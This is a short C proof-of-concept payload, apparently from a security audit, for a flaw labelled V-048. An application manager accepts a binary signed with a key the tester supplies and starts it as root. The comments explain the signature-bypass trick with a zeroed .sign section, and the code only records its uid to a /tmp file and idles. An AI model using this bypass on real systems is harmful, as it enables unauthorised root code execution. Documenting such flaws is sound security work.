/* Proof-of-concept payload for V-048: demonstrates that a binary signed with a key
   we supply ourselves is accepted by the application manager and started as root.
   It records its own uid and the value it was started with, then idles so the
   parent can inspect /proc. */
#include <stdio.h>
#include <unistd.h>
#include <string.h>

/* The verifier hashes the whole file with the .sign section bytes zeroed, then
   RSA-verifies a 256-byte signature against /tmp/app_normal.key. Providing a
   present-but-zero section means the file we hash is the file we sign. */
__asm__(
    ".section .sign,\"a\",@progbits\n"
    ".balign 1\n"
    ".space 256, 0\n"
    ".previous\n");

int main(void) {
    FILE *f = fopen("/tmp/v048-proof.txt", "w");
    if (f) {
        fprintf(f, "V048_PAYLOAD_RAN\n");
        fprintf(f, "uid=%d euid=%d gid=%d\n", getuid(), geteuid(), getgid());
        fprintf(f, "proof=an_unsigned_by_vendor_binary_was_launched\n");
        fclose(f);
    }
    sleep(600);
    return 0;
}
